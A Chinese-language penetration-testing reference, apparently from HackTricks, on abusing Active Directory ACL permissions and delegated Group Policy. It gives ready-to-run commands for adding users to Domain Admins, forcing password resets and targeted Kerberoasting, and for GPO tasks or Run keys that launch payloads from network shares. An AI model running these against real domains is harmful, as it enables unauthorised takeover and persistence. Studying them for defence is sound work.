# 滥用 Active Directory ACLs/ACEs

{{#include ../../../banners/hacktricks-training.md}}

**本页主要总结了来自** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces) **和** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)**的技术。有关更多细节，请查看原始文章。**

## BadSuccessor


{{#ref}}
BadSuccessor.md
{{#endref}}

## **GenericAll 权限（针对用户）**

该权限授予攻击者对目标用户帐户的完全控制。一旦使用 `Get-ObjectAcl` 命令确认了 `GenericAll` 权限，攻击者可以：

- **更改目标的密码**：使用 `net user <username> <password> /domain`，攻击者可以重置该用户的密码。
- **Targeted Kerberoasting**: 将 SPN 分配给用户帐户以使其 kerberoastable，然后使用 Rubeus 和 targetedKerberoast.py 提取并尝试破解 ticket-granting ticket (TGT) 的哈希。
```bash
Set-DomainObject -Credential $creds -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}
.\Rubeus.exe kerberoast /user:<username> /nowrap
Set-DomainObject -Credential $creds -Identity <username> -Clear serviceprincipalname -Verbose
```
- **Targeted ASREPRoasting**: 禁用该用户的 pre-authentication，使其帐户容易受到 ASREPRoasting 攻击。
```bash
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```
## **GenericAll 权限（对组）**

该特权允许攻击者在对像 `Domain Admins` 这样的组拥有 `GenericAll` 权限时操纵组成员。使用 `Get-NetGroup` 确定该组的 distinguished name（区分名称）后，攻击者可以：

- **将自己添加到 Domain Admins 组**：这可以通过直接命令完成，或使用像 Active Directory 或 PowerSploit 这样的模块。
```bash
net group "domain admins" spotless /add /domain
Add-ADGroupMember -Identity "domain admins" -Members spotless
Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"
```
- 在 Linux 上，当你对某些组拥有 GenericAll/Write 成员权限时，也可以利用 BloodyAD 将自己添加到任意组中。如果目标组被嵌套在 “Remote Management Users” 中，凡是遵循该组的主机你将立即获得 WinRM 访问权限：
```bash
# Linux tooling example (BloodyAD) to add yourself to a target group
bloodyAD --host <dc-fqdn> -d <domain> -u <user> -p '<pass>' add groupMember "<Target Group>" <user>

# If the target group is member of "Remote Management Users", WinRM becomes available
netexec winrm <dc-fqdn> -u <user> -p '<pass>'
```
## **GenericAll / GenericWrite / Write on Computer/User**

在计算机对象或用户帐户上拥有这些权限可允许：

- **Kerberos Resource-based Constrained Delegation**: 可以接管计算机对象。
- **Shadow Credentials**: 利用该技术通过使用这些权限创建 shadow credentials 来模拟计算机或用户帐户。

## **WriteProperty on Group**

如果用户对特定组的所有对象拥有 `WriteProperty` 权限（例如 `Domain Admins`），他们可以：

- **Add Themselves to the Domain Admins Group**: 通过结合 `net user` 和 `Add-NetGroupUser` 命令实现，此方法允许在域内提权。
```bash
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```
## **Self（组内自我成员资格）**

此权限允许攻击者通过直接操作组成员的命令将自己添加到特定组，例如 `Domain Admins`。使用下面的命令序列可以实现自我添加：
```bash
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```
## **WriteProperty (Self-Membership)**

这是一个类似的权限，允许攻击者在对这些组拥有 `WriteProperty` 权利时，通过修改组属性将自己直接添加到组中。该权限的确认和执行使用以下方式进行：
```bash
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
net group "domain admins" spotless /add /domain
```
## **ForceChangePassword**

拥有某个用户的 `ExtendedRight`（用于 `User-Force-Change-Password`）可以在不知道当前密码的情况下重置密码。可以通过 PowerShell 或其他命令行工具验证并利用该权限，提供多种重置用户密码的方法，包括交互式会话和用于非交互环境的单行命令。相关命令从简单的 PowerShell 调用到在 Linux 上使用 `rpcclient` 不等，展示了攻击向量的多样性。
```bash
Get-ObjectAcl -SamAccountName delegate -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainUserPassword -Identity delegate -Verbose
Set-DomainUserPassword -Identity delegate -AccountPassword (ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
```

```bash
rpcclient -U KnownUsername 10.10.10.192
> setuserinfo2 UsernameChange 23 'ComplexP4ssw0rd!'
```
## **WriteOwner on Group**

如果攻击者发现自己对某个组拥有 `WriteOwner` 权限，他们可以将该组的所有者更改为自己。当涉及的组是 `Domain Admins` 时，这尤其具有重大影响，因为更改所有者会允许对组属性和成员资格进行更广泛的控制。该过程包括通过 `Get-ObjectAcl` 确定正确的对象，然后使用 `Set-DomainObjectOwner` 修改所有者，可通过 SID 或名称进行修改。
```bash
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainObjectOwner -Identity S-1-5-21-2552734371-813931464-1050690807-512 -OwnerIdentity "spotless" -Verbose
Set-DomainObjectOwner -Identity Herman -OwnerIdentity nico
```
## **GenericWrite on User**

此权限允许攻击者修改用户属性。具体来说，拥有 `GenericWrite` 访问权限时，攻击者可以更改用户的登录脚本路径，以在用户登录时执行恶意脚本。实现方法是使用 `Set-ADObject` 命令将目标用户的 `scriptpath` 属性更新为指向攻击者脚本的路径。
```bash
Set-ADObject -SamAccountName delegate -PropertyName scriptpath -PropertyValue "\\10.0.0.5\totallyLegitScript.ps1"
```
## **GenericWrite on Group**

拥有此权限的攻击者可以操纵组成员关系，例如将自己或其他用户添加到特定组。该过程包括创建一个凭证对象，使用它向组中添加或移除用户，并使用 PowerShell 命令验证成员更改。
```bash
$pwd = ConvertTo-SecureString 'JustAWeirdPwd!$' -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential('DOMAIN\username', $pwd)
Add-DomainGroupMember -Credential $creds -Identity 'Group Name' -Members 'username' -Verbose
Get-DomainGroupMember -Identity "Group Name" | Select MemberName
Remove-DomainGroupMember -Credential $creds -Identity "Group Name" -Members 'username' -Verbose
```
## **WriteDACL + WriteOwner**

拥有一个 AD object 并对其具有 `WriteDACL` 权限，攻击者可以将自己授予对该对象的 `GenericAll` 权限。  
这是通过 ADSI 操作来完成的，使攻击者能够完全控制该对象并修改其组成员关系。  
尽管如此，使用 Active Directory module 的 `Set-Acl` / `Get-Acl` cmdlets 来利用这些权限时仍存在限制。
```bash
$ADSI = [ADSI]"LDAP://CN=test,CN=Users,DC=offense,DC=local"
$IdentityReference = (New-Object System.Security.Principal.NTAccount("spotless")).Translate([System.Security.Principal.SecurityIdentifier])
$ACE = New-Object System.DirectoryServices.ActiveDirectoryAccessRule $IdentityReference,"GenericAll","Allow"
$ADSI.psbase.ObjectSecurity.SetAccessRule($ACE)
$ADSI.psbase.commitchanges()
```
## **域内复制 (DCSync)**

DCSync 攻击利用域上的特定复制权限，模拟域控制器并同步数据，包括用户凭证。该强大技术需要类似 `DS-Replication-Get-Changes` 的权限，使攻击者在无需直接访问域控制器的情况下从 AD 环境中提取敏感信息。 [**Learn more about the DCSync attack here.**](../dcsync.md)

## GPO 委派 <a href="#gpo-delegation" id="gpo-delegation"></a>

### GPO 委派

被委派管理 Group Policy Objects (GPOs) 的访问权限可能带来显著的安全风险。例如，如果像 `offense\spotless` 这样的用户被委派 GPO 管理权限，他们可能拥有 **WriteProperty**、**WriteDacl** 和 **WriteOwner** 等权限。这些权限可能被滥用以实施恶意操作，可通过 PowerView 识别：`bash Get-ObjectAcl -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`

### 列举 GPO 权限

为识别配置错误的 GPO，可以将 PowerSploit 的 cmdlets 链接在一起。这可以发现特定用户有权限管理的 GPO：`powershell Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name} | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`

**应用了特定策略的计算机**：可以解析特定 GPO 应用于哪些计算机，从而帮助了解潜在影响的范围。`powershell Get-NetOU -GUID "{DDC640FF-634A-4442-BC2E-C05EED132F0C}" | % {Get-NetComputer -ADSpath $_}`

**应用于特定计算机的策略**：要查看某台计算机上应用了哪些策略，可以使用诸如 `Get-DomainGPO` 的命令。

**应用了特定策略的 OU**：使用 `Get-DomainOU` 可以识别受某个策略影响的组织单位 (OUs)。

你也可以使用工具 [**GPOHound**](https://github.com/cogiceo/GPOHound) 来枚举 GPOs 并发现其中的问题。

### 滥用 GPO - New-GPOImmediateTask

配置错误的 GPO 可被利用来执行代码，例如通过创建一个立即执行的计划任务。这可以用于将用户添加到受影响机器的本地 administrators 组，从而显著提升权限：
```bash
New-GPOImmediateTask -TaskName evilTask -Command cmd -CommandArguments "/c net localgroup administrators spotless /add" -GPODisplayName "Misconfigured Policy" -Verbose -Force
```
### GroupPolicy module - Abuse GPO

如果已安装 GroupPolicy module，允许创建并链接新的 GPOs，并设置首选项（例如 registry values），以在受影响的计算机上执行 backdoors。此方法要求更新 GPO 并且需要用户登录该计算机后才能执行：
```bash
New-GPO -Name "Evil GPO" | New-GPLink -Target "OU=Workstations,DC=dev,DC=domain,DC=io"
Set-GPPrefRegistryValue -Name "Evil GPO" -Context Computer -Action Create -Key "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" -ValueName "Updater" -Value "%COMSPEC% /b /c start /b /min \\dc-2\software\pivot.exe" -Type ExpandString
```
### SharpGPOAbuse - Abuse GPO

SharpGPOAbuse 提供了一种方法，可以通过添加任务或修改设置来滥用现有的 GPOs，而无需创建新的 GPOs。该工具需要先修改现有的 GPOs 或使用 RSAT 工具创建新的 GPOs，然后再应用更改：
```bash
.\SharpGPOAbuse.exe --AddComputerTask --TaskName "Install Updates" --Author NT AUTHORITY\SYSTEM --Command "cmd.exe" --Arguments "/c \\dc-2\software\pivot.exe" --GPOName "PowerShell Logging"
```
### 强制更新策略

GPO 更新通常每约 90 分钟发生一次。为加快此过程，尤其是在实施更改之后，可在目标计算机上使用 `gpupdate /force` 命令以强制立即更新策略。此命令可确保对 GPOs 的任何修改在不等待下一次自动更新周期的情况下被应用。

### 背后原理

检查特定 GPO（例如 `Misconfigured Policy`）的 Scheduled Tasks 时，可以确认已添加诸如 `evilTask` 的任务。这些任务通常通过脚本或命令行工具创建，目的是修改系统行为或提升权限。

该任务的结构在由 `New-GPOImmediateTask` 生成的 XML 配置文件中有所展示，详细列出了计划任务的具体内容——包括要执行的命令及其触发器。该文件展示了在 GPOs 中如何定义和管理计划任务，提供了一种作为策略执行一部分来执行任意命令或脚本的方法。

### 用户与组

GPOs 还允许对目标系统上的用户和组成员资格进行操控。通过直接编辑 Users and Groups 策略文件，攻击者可以将用户添加到特权组，例如本地 `administrators` 组。这可以通过委派 GPO 管理权限实现，允许修改策略文件以包含新用户或更改组成员资格。

Users and Groups 的 XML 配置文件概述了这些更改的实现方式。通过向该文件添加条目，可以使特定用户在受影响系统上获得提升的权限。此方法通过操纵 GPO 提供了一种直接的权限提升途径。

此外，还可以考虑其它用于执行代码或维持持久性的方式，例如利用 logon/logoff scripts、修改用于自动启动的注册表键、通过 .msi 文件安装软件，或编辑服务配置等。这些技术为通过滥用 GPOs 来维持访问并控制目标系统提供了多种途径。

## References

- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces)
- [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)
- [https://wald0.com/?p=112](https://wald0.com/?p=112)
- [https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2)
- [https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/](https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/)
- [https://adsecurity.org/?p=3658](https://adsecurity.org/?p=3658)
- [https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System_DirectoryServices_ActiveDirectoryAccessRule\_\_ctor_System_Security_Principal_IdentityReference_System_DirectoryServices_ActiveDirectoryRights_System_Security_AccessControl_AccessControlType\_](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System_DirectoryServices_ActiveDirectoryAccessRule__ctor_System_Security_Principal_IdentityReference_System_DirectoryServices_ActiveDirectoryRights_System_Security_AccessControl_AccessControlType_)

{{#include ../../../banners/hacktricks-training.md}}
